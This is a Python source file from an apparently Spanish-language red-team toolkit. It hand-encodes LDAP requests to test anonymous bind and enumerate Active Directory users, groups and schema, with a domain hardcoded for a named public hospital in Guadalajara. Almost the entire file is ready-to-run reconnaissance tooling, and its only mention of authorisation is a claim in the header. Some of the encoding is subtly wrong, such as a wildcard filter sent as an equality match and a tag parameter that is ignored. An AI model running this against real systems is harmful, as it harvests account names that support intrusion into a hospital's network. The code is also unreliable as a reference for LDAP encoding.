#!/usr/bin/env python3
"""
🛡️ HCG Framework - LDAP Protocol Implementation
[CLASSIFIED]: CONFIDENTIAL - HCG Red Team Operation
[SCOPE]: OPD Hospital Civil de Guadalajara (CONV-0221-JAL-HCG-2026)

Implementación propia del protocolo LDAP a nivel de bytes para:
- Detección de bind anónimo
- Enumeración de usuarios/grupos sin autenticación
- Extracción de atributos sensibles
- Análisis de estructura de Active Directory

Referencias:
- RFC 4511 (LDAP Protocol)
- ASN.1 BER Encoding
"""

import socket
import struct
from typing import Optional, Dict, List, Any, Tuple


class LDAPProbe:
    """
    Sonda LDAP con encoding BER manual para operaciones de enumeración.
    
    Permite:
    - Verificar bind anónimo sin herramientas externas
    - Búsquedas LDAP con filtros personalizados
    - Extracción de schema y atributos
    - Detección de configuraciones inseguras
    """
    
    # Códigos de operación LDAP
    OP_BIND = 0x60
    OP_UNBIND = 0x62
    OP_SEARCH = 0x63
    OP_MODIFY = 0x66
    OP_ADD = 0x68
    OP_DEL = 0x6a
    OP_MODRDN = 0x6c
    OP_COMPARE = 0x6e
    OP_ABANDON = 0x70
    
    # Ámbitos de búsqueda
    SCOPE_BASE = 0x00
    SCOPE_ONELEVEL = 0x01
    SCOPE_SUBTREE = 0x02
    
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout
        self.message_id = 1
    
    def _encode_length(self, length: int) -> bytes:
        """Codifica longitud en formato BER (variable length)."""
        if length < 0x80:
            return bytes([length])
        elif length < 0x100:
            return bytes([0x81, length])
        elif length < 0x10000:
            return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
        else:
            return bytes([0x83, (length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF])
    
    def _encode_ber_string(self, tag: int, s: str) -> bytes:
        """Codifica string con tag BER."""
        encoded = s.encode('utf-8')
        return bytes([tag]) + self._encode_length(len(encoded)) + encoded
    
    def _encode_ber_octet_string(self, tag: int, data: bytes) -> bytes:
        """Codifica octet string con tag BER."""
        return bytes([0x04]) + self._encode_length(len(data)) + data
    
    def _encode_ber_sequence(self, items: List[bytes]) -> bytes:
        """Codifica secuencia BER."""
        content = b''.join(items)
        return bytes([0x30]) + self._encode_length(len(content)) + content
    
    def _wrap_ldap_message(self, pdu: bytes, message_id: int) -> bytes:
        """Envuelve PDU en LDAP Message envelope."""
        msg_id = self._encode_ber_integer(message_id)
        return self._encode_ber_sequence([msg_id, pdu])
    
    def _encode_ber_integer(self, value: int) -> bytes:
        """Codifica entero en BER."""
        if value == 0:
            return bytes([0x02, 0x01, 0x00])
        elif value < 0x80:
            return bytes([0x02, 0x01, value])
        elif value < 0x100:
            return bytes([0x02, 0x02, 0x00, value])
        else:
            # Para valores más grandes
            hex_val = f'{value:x}'
            if len(hex_val) % 2:
                hex_val = '0' + hex_val
            byte_data = bytes.fromhex(hex_val)
            if byte_data[0] & 0x80:
                byte_data = b'\x00' + byte_data
            return bytes([0x02]) + self._encode_length(len(byte_data)) + byte_data
    
    def _build_bind_request(self, dn: str = "", password: str = "") -> bytes:
        """Construye BindRequest LDAP."""
        version = self._encode_ber_integer(3)
        
        if dn:
            name = self._encode_ber_string(0x04, dn)  # LDAPString
        else:
            name = bytes([0x04, 0x00])  # Empty string (anonymous)
        
        if password:
            # Simple authentication
            auth = bytes([0x80]) + self._encode_length(len(password)) + password.encode('utf-8')
        else:
            # Anonymous bind
            auth = bytes([0x80, 0x00])  # Context-specific primitive, length 0
        
        bind_content = self._encode_ber_sequence([version, name, auth])
        return bytes([self.OP_BIND]) + self._encode_length(len(bind_content)) + bind_content
    
    def _build_search_request(
        self,
        base_dn: str,
        scope: int = SCOPE_SUBTREE,
        filter_str: str = "(objectClass=*)",
        attributes: Optional[List[str]] = None
    ) -> bytes:
        """Construye SearchRequest LDAP con filtro personalizado."""
        # BaseObject
        base = self._encode_ber_string(0x04, base_dn)
        
        # Scope
        scope_enc = bytes([0x0a, 0x01, scope])
        
        # DerefAliases (never)
        deref = bytes([0x0a, 0x01, 0x00])
        
        # SizeLimit (0 = no limit)
        size = bytes([0x02, 0x01, 0x00])
        
        # TimeLimit (0 = no limit)
        time_limit = bytes([0x02, 0x01, 0x00])
        
        # TypesOnly (false)
        types = bytes([0x01, 0x01, 0x00])
        
        # Filter (simple string for now)
        filter_enc = self._encode_filter(filter_str)
        
        # Attributes
        if attributes:
            attrs_list = [self._encode_ber_string(0x04, attr) for attr in attributes]
            attrs = self._encode_ber_sequence(attrs_list)
        else:
            attrs = bytes([0x30, 0x00])  # Empty sequence = all attributes
        
        search_content = self._encode_ber_sequence([
            base, scope_enc, deref, size, time_limit, types, filter_enc, attrs
        ])
        return bytes([self.OP_SEARCH]) + self._encode_length(len(search_content)) + search_content
    
    def _encode_filter(self, filter_str: str) -> bytes:
        """
        Codifica filtro LDAP simple.
        Soporta: (attr=value), (&...), (|...), (!(...))
        """
        filter_str = filter_str.strip()
        
        if filter_str.startswith('(&'):
            # AND filter
            filters = self._parse_compound_filter(filter_str[2:-1])
            filter_items = [self._encode_filter(f) for f in filters]
            content = self._encode_ber_sequence(filter_items)
            return bytes([0xa0]) + self._encode_length(len(content)) + content
        
        elif filter_str.startswith('(|'):
            # OR filter
            filters = self._parse_compound_filter(filter_str[2:-1])
            filter_items = [self._encode_filter(f) for f in filters]
            content = self._encode_ber_sequence(filter_items)
            return bytes([0xa1]) + self._encode_length(len(content)) + content
        
        elif filter_str.startswith('(!'):
            # NOT filter
            inner = self._encode_filter(filter_str[2:-1])
            return bytes([0xa2]) + self._encode_length(len(inner)) + inner
        
        else:
            # Equality filter (attr=value)
            if '=' in filter_str:
                attr, value = filter_str[1:-1].split('=', 1)
                attr_enc = self._encode_ber_string(0x04, attr)
                val_enc = self._encode_ber_string(0x04, value)
                content = self._encode_ber_sequence([attr_enc, val_enc])
                return bytes([0xa3]) + self._encode_length(len(content)) + content
        
        # Fallback: filter as-is
        return self._encode_ber_string(0x04, filter_str)
    
    def _parse_compound_filter(self, filter_str: str) -> List[str]:
        """Parsea filtros compuestos (&...) o (|...)."""
        filters = []
        depth = 0
        start = 0
        
        for i, c in enumerate(filter_str):
            if c == '(':
                if depth == 0:
                    start = i
                depth += 1
            elif c == ')':
                depth -= 1
                if depth == 0:
                    filters.append(filter_str[start:i+1])
        
        return filters if filters else [filter_str]
    
    def check_anonymous_bind(self, host: str, port: int = 389) -> bool:
        """
        Verifica si el servidor LDAP permite bind anónimo.
        
        Args:
            host: IP o hostname del servidor LDAP
            port: Puerto LDAP (389 estándar, 636 para LDAPS)
            
        Returns:
            True si bind anónimo está permitido
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        try:
            sock.connect((host, port))
            
            # Construir BindRequest anónimo
            bind_req = self._build_bind_request(dn="", password="")
            ldap_msg = self._wrap_ldap_message(bind_req, self.message_id)
            
            sock.send(ldap_msg)
            response = sock.recv(4096)
            
            result_code = self._extract_result_code(response)
            return result_code == 0  # success
            
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False
        finally:
            sock.close()
    
    def search_anonymous(
        self,
        host: str,
        base_dn: str = "DC=hcg,DC=gob,DC=mx",
        filter_str: str = "(objectClass=*)",
        attributes: Optional[List[str]] = None,
        port: int = 389,
        scope: int = SCOPE_SUBTREE
    ) -> Optional[List[Dict[str, Any]]]:
        """
        Realiza búsqueda LDAP anónima.
        
        Args:
            host: Servidor LDAP
            base_dn: DN base para la búsqueda
            filter_str: Filtro LDAP
            attributes: Lista de atributos a retornar (None = todos)
            port: Puerto LDAP
            scope: Ámbito de búsqueda (BASE, ONELEVEL, SUBTREE)
            
        Returns:
            Lista de entradas encontradas o None si falla
        """
        if not self.check_anonymous_bind(host, port):
            return None
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout * 2)
        
        try:
            sock.connect((host, port))
            
            # Bind anónimo primero
            bind_req = self._build_bind_request()
            bind_msg = self._wrap_ldap_message(bind_req, self.message_id)
            sock.send(bind_msg)
            sock.recv(4096)  # Ignorar respuesta de bind
            
            self.message_id += 1
            
            # Search request
            search_req = self._build_search_request(base_dn, scope, filter_str, attributes)
            search_msg = self._wrap_ldap_message(search_req, self.message_id)
            sock.send(search_msg)
            
            entries = []
            while True:
                response = sock.recv(65536)
                if not response:
                    break
                
                parsed = self._parse_search_response(response)
                if parsed['entries']:
                    entries.extend(parsed['entries'])
                if parsed.get('done'):
                    break
                    
                # Verificar si hay más datos
                if len(response) < 65536:
                    break
            
            return entries
            
        except Exception:
            return None
        finally:
            sock.close()
    
    def _extract_result_code(self, response: bytes) -> int:
        """Extrae código de resultado de BindResponse/SearchResultDone."""
        # Buscar resultCode en la respuesta
        # ResultCode es un ENUMERATED (tag 0x0a) dentro del_SEQUENCE
        offset = 0
        while offset < len(response) - 2:
            if response[offset:offset+2] == b'\x0a\x01':
                return response[offset + 2]
            offset += 1
        return -1  # Error parsing
    
    def _parse_search_response(self, response: bytes) -> Dict[str, Any]:
        """
        Parsea SearchResultEntry y SearchResultDone.
        
        Retorna diccionario con:
        - entries: lista de entradas encontradas
        - done: True si es SearchResultDone
        - result_code: código de resultado si es done
        """
        result = {'entries': [], 'done': False, 'result_code': None}
        
        # Parseo simplificado - buscar patrones comunes
        offset = 0
        while offset < len(response):
            if offset + 2 > len(response):
                break
            
            tag = response[offset]
            
            # SearchResultEntry (tag 0x64)
            if tag == 0x64:
                entry = self._parse_search_result_entry(response, offset)
                if entry:
                    result['entries'].append(entry)
                    offset += entry.get('_raw_len', 1)
                else:
                    offset += 1
            
            # SearchResultDone (tag 0x65)
            elif tag == 0x65:
                result['done'] = True
                # Extraer resultCode
                if offset + 4 < len(response):
                    if response[offset+2:offset+4] == b'\x0a\x01':
                        result['result_code'] = response[offset + 4]
                break
            
            else:
                offset += 1
        
        return result
    
    def _parse_search_result_entry(self, data: bytes, offset: int) -> Optional[Dict[str, Any]]:
        """Parsea SearchResultEntry individual."""
        try:
            entry = {}
            pos = offset + 1  # Saltar tag 0x64
            
            # Leer longitud
            if pos >= len(data):
                return None
            
            length = data[pos]
            if length & 0x80:
                num_bytes = length & 0x7F
                if num_bytes == 1 and pos + 2 <= len(data):
                    length = data[pos + 1]
                    pos += 2
                elif num_bytes == 2 and pos + 3 <= len(data):
                    length = (data[pos + 1] << 8) | data[pos + 2]
                    pos += 3
            else:
                pos += 1
            
            entry_start = pos
            
            # ObjectName (LDAPDN)
            if pos < len(data) and data[pos] == 0x04:
                pos += 1
                dn_len = data[pos] if pos < len(data) else 0
                pos += 1
                if pos + dn_len <= len(data):
                    entry['distinguishedName'] = data[pos:pos + dn_len].decode('utf-8', errors='replace')
                    pos += dn_len
            
            # Attributes (SEQUENCE OF SEQUENCE)
            if pos < len(data) and data[pos] == 0x30:
                pos += 1
                if pos < len(data):
                    attrs_len = data[pos]
                    pos += 1
                    
                    while pos < len(data) and data[pos] == 0x30:
                        # Attribute SEQUENCE
                        pos += 1
                        if pos < len(data):
                            attr_seq_len = data[pos]
                            pos += 1
                            
                            # Attribute type
                            if pos < len(data) and data[pos] == 0x04:
                                pos += 1
                                type_len = data[pos] if pos < len(data) else 0
                                pos += 1
                                if pos + type_len <= len(data):
                                    attr_type = data[pos:pos + type_len].decode('utf-8', errors='replace')
                                    pos += type_len
                                    
                                    # Attribute values (SET OF LDAPString)
                                    values = []
                                    if pos < len(data) and data[pos] == 0x31:
                                        pos += 2  # Saltar 0x31 y longitud
                                        while pos < len(data) and data[pos] == 0x04:
                                            pos += 1
                                            val_len = data[pos] if pos < len(data) else 0
                                            pos += 1
                                            if pos + val_len <= len(data):
                                                val = data[pos:pos + val_len].decode('utf-8', errors='replace')
                                                values.append(val)
                                                pos += val_len
                                    
                                    entry[attr_type] = values
            
            entry['_raw_len'] = pos - offset
            return entry
            
        except Exception:
            return None
    
    def enumerate_users(self, host: str, port: int = 389) -> Optional[List[str]]:
        """Enumera usuarios de Active Directory vía LDAP anónimo."""
        # Filtros comunes para usuarios AD
        filters = [
            "(objectClass=user)",
            "(&(objectClass=user)(objectCategory=person))",
            "(sAMAccountType=805306368)"  # User objects
        ]
        
        users = []
        for f in filters:
            results = self.search_anonymous(
                host,
                base_dn="DC=hcg,DC=gob,DC=mx",
                filter_str=f,
                attributes=['sAMAccountName', 'cn', 'displayName'],
                port=port
            )
            if results:
                for entry in results:
                    if 'sAMAccountName' in entry:
                        users.extend(entry['sAMAccountName'])
                    elif 'cn' in entry:
                        users.extend(entry['cn'])
        
        return list(set(users)) if users else None
    
    def enumerate_groups(self, host: str, port: int = 389) -> Optional[List[str]]:
        """Enumera grupos de Active Directory vía LDAP anónimo."""
        results = self.search_anonymous(
            host,
            base_dn="DC=hcg,DC=gob,DC=mx",
            filter_str="(objectClass=group)",
            attributes=['cn', 'sAMAccountName', 'member'],
            port=port
        )
        
        if results:
            groups = []
            for entry in results:
                if 'cn' in entry:
                    groups.extend(entry['cn'])
            return groups
        
        return None
    
    def get_schema(self, host: str, port: int = 389) -> Optional[Dict[str, Any]]:
        """Obtiene información del schema LDAP."""
        results = self.search_anonymous(
            host,
            base_dn="CN=Schema,CN=Configuration,DC=hcg,DC=gob,DC=mx",
            filter_str="(objectClass=*)",
            attributes=['attributeID', 'attributeSyntax', 'lDAPDisplayName'],
            port=port,
            scope=self.SCOPE_ONELEVEL
        )
        
        if results:
            return {'schema_entries': results}
        return None


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Uso: python ldap.py <target_host> [port]")
        print("Ejemplo: python ldap.py 10.2.1.1 389")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 389
    
    probe = LDAPProbe()
    
    print(f"[*] Verificando bind anónimo en {target}:{port}")
    if probe.check_anonymous_bind(target, port):
        print(f"[+] ✅ Bind ANÓNIMO permitido")
        
        print("\n[*] Enumerando usuarios...")
        users = probe.enumerate_users(target, port)
        if users:
            print(f"    Usuarios encontrados: {len(users)}")
            for u in users[:10]:
                print(f"      - {u}")
            if len(users) > 10:
                print(f"      ... y {len(users) - 10} más")
        
        print("\n[*] Enumerando grupos...")
        groups = probe.enumerate_groups(target, port)
        if groups:
            print(f"    Grupos encontrados: {len(groups)}")
            for g in groups[:10]:
                print(f"      - {g}")
            if len(groups) > 10:
                print(f"      ... y {len(groups) - 10} más")
    else:
        print(f"[-] ❌ Bind anónimo NO permitido")
